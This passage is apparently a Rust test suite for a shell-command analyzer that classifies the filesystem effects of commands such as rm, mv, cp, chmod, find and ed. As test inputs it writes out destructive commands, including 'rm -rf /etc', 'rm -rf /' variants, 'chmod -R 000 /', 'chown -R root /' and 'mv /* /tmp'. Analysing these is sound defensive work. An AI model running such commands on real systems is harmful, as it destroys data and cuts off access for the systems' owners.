/// that would read nothing.
#[test]
fn mv_reads_each_source_as_program_input() {
    for (argv, sources) in [
        (&["mv", "a", "b"][..], &["/w/a"][..]),
        (&["mv", "-t", "dest", "a", "b"], &["/w/a", "/w/b"]),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(resources(&plan, "filesystem.read"), sources, "{argv:?}");
        for source in sources {
            assert_eq!(
                attr_for(&plan, "filesystem.read", source, "access_purpose"),
                Some(AttrValue::String("program_input".into())),
                "{argv:?}"
            );
        }
    }
}

#[test]
fn cp_program_input_requires_a_content_copy_grammar() {
    let targeted = analyze(
        &[
            "cp",
            "--recursive",
            "-v",
            "-S",
            ".bak",
            "-t",
            "dest",
            "a",
            "b",
        ],
        Some("/w"),
    );
    assert_eq!(
        resources(&targeted, "filesystem.read"),
        vec!["/w/a", "/w/b"]
    );
    for source in ["/w/a", "/w/b"] {
        assert_eq!(
            attr_for(&targeted, "filesystem.read", source, "access_purpose"),
            Some(AttrValue::String("program_input".into()))
        );
    }

    let no_target_directory = analyze(&["cp", "--no-target-directory", "a", "b"], Some("/w"));
    assert_eq!(
        attr_for(
            &no_target_directory,
            "filesystem.read",
            "/w/a",
            "access_purpose"
        ),
        Some(AttrValue::String("program_input".into()))
    );

    for argv in [
        &["cp", "-l", "a", "b"][..],
        &["cp", "--symbolic-link", "a", "b"],
        &["cp", "--attributes-only", "a", "b"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(resources(&plan, "filesystem.read").is_empty(), "{argv:?}");
        assert!(!has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }

    for argv in [
        &["cp", "--future", "value", "a", "b"][..],
        &["cp", "--preserve=mode", "a", "b"],
        &["cp", "--verbose=garbage", "a", "b"],
        &["cp", "--recursive=garbage", "a", "b"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(resources(&plan, "filesystem.read").is_empty(), "{argv:?}");
        assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
    }

    for argv in [
        &["cp", "-T", "a", "b", "c"][..],
        &["cp", "-T", "-t", "dest", "a"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(resources(&plan, "filesystem.read").is_empty(), "{argv:?}");
    }
}

#[test]
fn find_delete_emits_delete() {
    let plan = analyze(&["find", "/tmp", "-delete"], None);
    assert!(has_effect(&plan, "filesystem.delete", "/tmp"));
    assert_eq!(
        attr(&plan, "filesystem.delete", "recursive"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn coreutils_data_paths_declare_access_semantics() {
    for (argv, resource) in [
        (&["find", "/tmp", "-exec", "rm", "{}", "+"][..], "/tmp"),
        (&["jq", ".name", "input.json"][..], "/w/input.json"),
        (&["uniq", "input", "output"][..], "/w/input"),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr_for(&plan, "filesystem.read", resource, "access_purpose"),
            Some(AttrValue::String("program_input".into())),
            "{argv:?}"
        );
    }

    for (argv, resource) in [
        (&["sort", "-o", "output"][..], "/w/output"),
        (&["tee", "output"][..], "/w/output"),
        (&["uniq", "input", "output"][..], "/w/output"),
        (&["strace", "-o", "trace", "true"][..], "/w/trace"),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert_eq!(
            attr_for(&plan, "filesystem.write", resource, "disclosure"),
            Some(AttrValue::String("contents".into())),
            "{argv:?}"
        );
    }
}

#[test]
fn rm_in_for_loop_preserves_glob() {
    let plan = analyze_shell("for f in *.log; do rm \"$f\"; done", Some("/srv/data"));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(
                &effect.resource,
                ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern } } if pattern == "/srv/data/*.log"
            )
            && effect.condition.is_some()
    }));
}

#[test]
fn rm_in_for_loop_keeps_options_out_of_targets() {
    let plan = analyze_shell("for f in -r safe; do rm \"$f\"; done", Some("/srv/data"));
    let deletes: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.delete")
        .collect();
    assert_eq!(deletes.len(), 1, "{deletes:#?}");
    assert!(matches!(
        &deletes[0].resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::FsPath { path }
        } if path == "/srv/data/safe"
    ));
}

#[test]
fn rm_in_independent_for_loops_keeps_option_choices_independent() {
    let plan = analyze_shell(
        "for f in -r safe; do for g in -r safe; do rm \"$f\" \"$g\"; done; done",
        Some("/srv/data"),
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/srv/data/safe"
            )
            && effect.attributes.get("recursive") == Some(&AttrValue::Bool(true))
    }));
}

#[test]
fn rm_in_for_loop_expands_glob_inside_word() {
    let plan = analyze_shell(
        "for f in *.log; do rm \"prefix-$f.bak\"; done",
        Some("/srv/data"),
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && matches!(
                &effect.resource,
                ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern } }
                    if pattern == "/srv/data/prefix-*.log.bak"
            )
            && effect.condition.is_some()
    }));
}

#[test]
fn chmod_recursive_metadata() {
    let plan = analyze(&["chmod", "-R", "755", "/etc"], None);
    assert!(has_effect(&plan, "filesystem.metadata", "/etc"));
    assert_eq!(
        attr(&plan, "filesystem.metadata", "recursive"),
        Some(AttrValue::Bool(true))
    );
    assert_eq!(
        attr(&plan, "filesystem.metadata", "action"),
        Some(AttrValue::String("chmod".into()))
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.metadata"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
    }));

    // An empty pathname names no file, not the cwd.
    let empty = analyze(&["chmod", "-R", "000", ""], Some("/work"));
    assert!(
        !empty
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.metadata"),
        "{:#?}",
        empty.effects
    );

    for source in [
        "chmod -R 000 \"$TARGET\"",
        "chmod --reference=reference \"$TARGET\"",
        // An unknown mode still changes the established target's metadata.
        "chmod \"$MODE\" /etc",
        "find /home/alice -exec chmod 000 '{}' +",
    ] {
        let plan = analyze_shell(source, Some("/work"));
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.metadata"
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
                    && effect.attributes.get("action") == Some(&AttrValue::String("chmod".into()))
            }),
            "{source}: {:#?}",
            plan.effects
        );
    }

    let plan = analyze_shell("chmod --reference=\"$REFERENCE\" /etc", Some("/work"));
    assert!(
        !plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.metadata"
                && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
        }),
        "{:#?}",
        plan.effects
    );
}

#[test]
fn destructive_filesystem_requests_keep_operation_exact_and_selection_honest() {
    let literal = analyze(&["rm", "-rf", "/etc"], None);
    assert!(literal.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            && matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/etc"
            )
    }));

    let pattern = analyze_shell("rm -rf /et?", Some("/work"));
    assert!(pattern.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            && matches!(effect.resource, ResourceExpr::Pattern { .. })
    }));

    let symbolic = analyze_shell("rm -rf \"$TARGET\"", Some("/work"));
    assert!(
        symbolic.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete"
                && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
        }),
        "{:#?}",
        symbolic.effects
    );

    for argv in [
        &["rm", "-rf", "/", "--help"] as &[&str],
        &["rm", "--bogus", "-rf", "/"],
        &["chmod", "--help", "/"],
        &["chmod", "--reference"],
        &["chmod", "--unknown", "-R", "000", "/"],
        &["chown", "--unknown", "-R", "root", "/"],
    ] {
        let plan = analyze(argv, None);
        assert!(
            !plan.effects.iter().any(|effect| {
                matches!(
                    effect.operation.0.as_str(),
                    "filesystem.delete" | "filesystem.metadata"
                ) && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            }),
            "{argv:?}: {:#?}",
            plan.effects
        );
    }
    let unresolved_control = analyze_shell("\"$CMD\" -rf /", Some("/work"));
    assert!(!unresolved_control.effects.iter().any(|effect| {
        matches!(
            effect.operation.0.as_str(),
            "filesystem.delete" | "filesystem.metadata"
        ) && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
    }));
}

/// A glob's members each land in the target directory under their own
/// basename, so the destination stays a selection pattern paired with the
/// source deletion. Without this the consumer reads either an unresolved
/// destination or the directory itself, and cannot say where the selected
/// entries go.
fn glob(expr: &ResourceExpr) -> Option<&str> {
    match expr {
        ResourceExpr::Pattern {
            pattern: effinterp_proto::ResourcePattern::FsPath { glob },
        } => Some(glob),
        _ => None,
    }
}

/// The paired source and destination of every recorded transfer, rendered as
/// `operation resource`.
fn transfers(plan: &Plan) -> Vec<(effinterp_proto::CausalAssurance, String, String)> {
    let graph = plan.causality.graph.as_ref().expect("causality detail");
    let interactions: std::collections::BTreeMap<_, _> = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            effinterp_proto::OccurrenceKind::ResourceInteraction {
                operation,
                resource,
                ..
            } => Some((
                node.id.clone(),
                format!("{} {}", operation.0, render(resource)),
            )),
            _ => None,
        })
        .collect();
    graph
        .edges
        .iter()
        .filter(|edge| edge.reason == effinterp_proto::CausalReason::ResourceTransfer)
        .map(|edge| {
            (
                edge.assurance,
                interactions[&edge.from].clone(),
                interactions[&edge.to].clone(),
            )
        })
        .collect()
}

#[test]
fn mv_target_directory_moves_each_source_and_rejects_unknown_flags() {
    for source in [
        "mv -t /tmp /*",
        "mv /* -t /tmp",
        "mv /* --target-directory=/tmp",
        // More than one source rules out the rename form, so the final
        // operand is the target directory here too.
        "mv /* /tmp",
        "mv -- /* /tmp",
    ] {
        let plan = analyze_shell(source, Some("/w"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.move"
                    && glob(&effect.resource) == Some("/*")
                    && effect.attributes.get("recursive") == Some(&AttrValue::Bool(true)))
        );
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.write"
                    && glob(&effect.resource) == Some("/tmp/*")
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact),
            "{source}: {:#?}",
            plan.effects
        );
        assert_eq!(
            transfers(&plan),
            vec![(
                effinterp_proto::CausalAssurance::Exact,
                "filesystem.delete Pattern { pattern: FsPath { glob: \"/*\" } }".to_string(),
                "filesystem.write Pattern { pattern: FsPath { glob: \"/tmp/*\" } }".to_string(),
            )],
            "{source}"
        );
        assert!(plan.boundaries.is_empty());
        for domain in ["filesystem", "process"] {
            assert_eq!(
                plan.coverage.level(&Domain::new(domain)),
                Some(CoverageLevel::Full)
            );
        }
    }
    // One source leaves both GNU forms open, so the target keeps its own path.
    for source in ["mv /etc /tmp", "mv -T /etc /tmp"] {
        let plan = analyze_shell(source, Some("/w"));
        assert_eq!(
            resources(&plan, "filesystem.write"),
            vec!["/tmp"],
            "{source}"
        );
    }
    let plan = analyze(&["mv", "-t", "/tmp", "a", "b"], Some("/w"));
    assert_eq!(resources(&plan, "filesystem.move"), vec!["/w/a", "/w/b"]);
    assert_eq!(
        resources(&plan, "filesystem.write"),
        vec!["/tmp/a", "/tmp/b"]
    );
    let plan = analyze(&["mv", "--bogus", "a", "b"], Some("/w"));
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    assert!(resources(&plan, "filesystem.move").is_empty());
    assert!(resources(&plan, "filesystem.write").is_empty());
}

#[test]
fn wc_files0_from_list_is_program_input() {
    let plan = analyze(&["wc", "--files0-from", ".env"], Some("/w"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/.env", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    assert!(has_boundary(&plan, "model_coverage"));
}

#[test]
fn less_attached_prompt_value() {
    let plan = analyze(&["less", "-Pprompt", "secret.txt"], Some("/w"));
    assert_eq!(resources(&plan, "filesystem.read"), vec!["/w/secret.txt"]);
    assert!(plan.boundaries.is_empty());
}

#[test]
fn less_log_file_is_written() {
    for flag in ["-o", "-O"] {
        let plan = analyze(&["less", flag, "log.txt"], Some("/w"));
        assert_eq!(resources(&plan, "filesystem.write"), vec!["/w/log.txt"]);
        assert!(resources(&plan, "filesystem.read").is_empty());
    }
}

#[test]
fn more_numeric_screen_size() {
    let plan = analyze(&["more", "-5", "secret.txt"], Some("/w"));
    assert_eq!(
        attr_for(&plan, "filesystem.read", "/w/secret.txt", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    assert!(plan.boundaries.is_empty());
}

#[test]
fn ed_stdin_script_writes() {
    let plan = analyze(&["ed", "notes.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/notes.txt"));
    assert!(has_effect(&plan, "filesystem.write", "/w/notes.txt"));
    assert!(has_boundary(&plan, "dynamic_source"));

    let plan = analyze_shell("printf ',p\\nq\\n' | ed -s notes.txt", Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/notes.txt"));

    let plan = analyze_shell("ed -s notes.txt <<< 'q'", Some("/w"));
    assert!(resources(&plan, "filesystem.write").is_empty());
    assert!(plan.boundaries.is_empty());

    let plan = analyze_shell("ed -s notes.txt <<< 'w'", Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/notes.txt"));
    assert!(plan.boundaries.is_empty());
}

#[test]
fn ex_command_write() {
    for argv in [
        &["ex", "-sc", "wq", "notes.txt"][..],
        &["ex", "-s", "-c", "wq", "notes.txt"],
        &["ex", "+wq", "notes.txt"],
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            has_effect(&plan, "filesystem.read", "/w/notes.txt"),
            "{argv:?}"
        );
        assert!(
            has_effect(&plan, "filesystem.write", "/w/notes.txt"),
            "{argv:?}"
        );
        assert!(plan.boundaries.is_empty(), "{argv:?}");
    }
    let plan = analyze(&["ex", "-sc", "q", "notes.txt"], Some("/w"));
    assert!(resources(&plan, "filesystem.write").is_empty());
    let plan = analyze(&["ex", "-m", "-c", "wq", "notes.txt"], Some("/w"));
    assert!(resources(&plan, "filesystem.write").is_empty());
}
